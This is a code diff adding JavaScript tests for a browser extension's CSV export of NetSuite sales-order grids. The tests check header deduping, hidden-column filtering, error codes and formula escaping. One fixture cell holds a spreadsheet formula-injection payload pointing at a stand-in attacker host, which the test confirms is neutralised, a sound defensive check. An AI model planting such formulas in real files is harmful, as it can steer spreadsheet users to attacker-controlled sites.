@@ -687,3 +687,128 @@ test("the runtime maps every mode to its own command", async () => {
   assert.match(runtimeSource, /mode === "exportView" \? viewCommand : exportCommand/);
   assert.match(runtimeSource, /run: \(\) => beginExport\("exportView"\)/);
 });
+
+test("readViewSnapshot dedupe never collides with literal duplicate labels", () => {
+  const core = createCore();
+  const cell = (textContent) => ({ textContent, querySelector: () => null });
+  const table = {
+    querySelector: (selector) => (selector.includes("headerrow")
+      ? { cells: [cell("Qty"), cell("Qty"), cell("Qty 2")] }
+      : null),
+    querySelectorAll: () => []
+  };
+  const snapshot = core.readViewSnapshot(table, () => false);
+  assert.deepEqual(plain(snapshot.headers), ["Qty", "Qty 2", "Qty 2 2"]);
+  assert.equal(new Set(snapshot.headers).size, snapshot.headers.length);
+});
+
+test("result detail accepts a zero-row exportView (headers-only export)", () => {
+  const core = createCore();
+  const result = core.normalizeResultDetail({
+    ok: true,
+    requestId: "csv-12345678",
+    filename: "salesord-1-view.csv",
+    recordType: "salesord",
+    sublistId: "",
+    mode: "exportView",
+    rowCount: 0,
+    columnCount: 4
+  }, "csv-12345678");
+  assert.equal(result.mode, "exportView");
+  assert.equal(result.rowCount, 0);
+});
+
+test("the CSV Utils menu wires the Export view item to the exportView mode", async () => {
+  const menuSource = await readFile(resolve(root, "src/record-actions/csv-import.js"), "utf8");
+  assert.match(menuSource, /invoke\("exportView"\)/);
+  assert.match(menuSource, /exportViewOption\.item/);
+});
+
+test("main-world view export snapshots the visible grid, protects formulas and guards edit mode", async () => {
+  const hiddenStyle = { display: "none" };
+  const visibleStyle = { display: "table-cell" };
+  const cell = (textContent, hidden = false) => ({
+    textContent,
+    __style: hidden ? hiddenStyle : visibleStyle,
+    querySelector: () => null,
+    classList: { contains: () => false }
+  });
+  const ghostCell = (textContent) => ({
+    textContent,
+    __style: visibleStyle,
+    querySelector: () => null,
+    classList: { contains: (name) => name === "suitemate-v3-so-columns-col-hidden" }
+  });
+  const row = (cells, hidden = false) => ({
+    cells,
+    __style: hidden ? hiddenStyle : visibleStyle,
+    classList: { contains: () => false }
+  });
+  const headerCells = [cell("Item"), ghostCell("Rate"), cell("Amount")];
+  const dataRows = [
+    row([cell('=HYPERLINK("https://evil.example")'), cell("$9"), cell("$36.00")]),
+    row([cell("SKU-2"), cell("$5"), cell("$24.00")], true)
+  ];
+  const table = {
+    querySelector: (selector) => (selector.includes("headerrow") ? { cells: headerCells } : null),
+    querySelectorAll: (selector) => (selector.includes("uir-machine-row") ? dataRows : [])
+  };
+
+  const { sandbox, links } = createMainWorldHarness();
+  sandbox.document.querySelector = (selector) => (selector === "#item_splits" ? table : null);
+  sandbox.getComputedStyle = (element) => element.__style ?? visibleStyle;
+  sandbox.URLSearchParams = URLSearchParams;
+  const core = sandbox.SuiteMateV3CsvExportCore;
+
+  const result = new Promise((resolveResult) => {
+    sandbox.addEventListener(core.RESULT_EVENT, (event) => resolveResult(event.detail), { once: true });
+  });
+  sandbox.dispatchEvent(new FakeCustomEvent(core.REQUEST_EVENT, {
+    detail: { requestId: "csv-view-123456", mode: "exportView" }
+  }));
+  assert.deepEqual(plain(await result), {
+    ok: true,
+    requestId: "csv-view-123456",
+    filename: "salesord-42-view.csv",
+    recordType: "salesord",
+    sublistId: "",
+    mode: "exportView",
+    rowCount: 1,
+    columnCount: 2
+  });
+  assert.equal(links.at(-1).download, "salesord-42-view.csv");
+  assert.equal(links.at(-1).clicked, true);
+  const csv = BrowserUrl.created.at(-1).parts[0];
+  assert.match(csv, /^﻿Item,Amount\r\n/);
+  assert.match(csv, /"'=HYPERLINK\(""https:\/\/evil\.example""\)",\$36\.00$/);
+
+  const missing = new Promise((resolveResult) => {
+    sandbox.addEventListener(core.RESULT_EVENT, (event) => resolveResult(event.detail), { once: true });
+  });
+  sandbox.document.querySelector = () => null;
+  sandbox.dispatchEvent(new FakeCustomEvent(core.REQUEST_EVENT, {
+    detail: { requestId: "csv-view-777777", mode: "exportView" }
+  }));
+  const missingDetail = plain(await missing);
+  assert.equal(missingDetail.ok, false);
+  assert.equal(missingDetail.error.code, "NO_VIEW_GRID");
+  assert.equal(missingDetail.error.message, "This page has no item grid to export.");
+
+  const editHarness = createMainWorldHarness({
+    location: "https://123456.app.netsuite.com/app/accounting/transactions/salesord.nl?id=42&e=T"
+  });
+  editHarness.sandbox.document.querySelector = () => table;
+  editHarness.sandbox.getComputedStyle = () => visibleStyle;
+  editHarness.sandbox.URLSearchParams = URLSearchParams;
+  const editCore = editHarness.sandbox.SuiteMateV3CsvExportCore;
+  const editResult = new Promise((resolveResult) => {
+    editHarness.sandbox.addEventListener(editCore.RESULT_EVENT, (event) => resolveResult(event.detail), { once: true });
+  });
+  editHarness.sandbox.dispatchEvent(new FakeCustomEvent(editCore.REQUEST_EVENT, {
+    detail: { requestId: "csv-view-654321", mode: "exportView" }
+  }));
+  const editDetail = plain(await editResult);
+  assert.equal(editDetail.ok, false);
+  assert.equal(editDetail.error.code, "VIEW_EXPORT_EDIT_MODE");
+  assert.equal(editHarness.links.length, 0);
+});
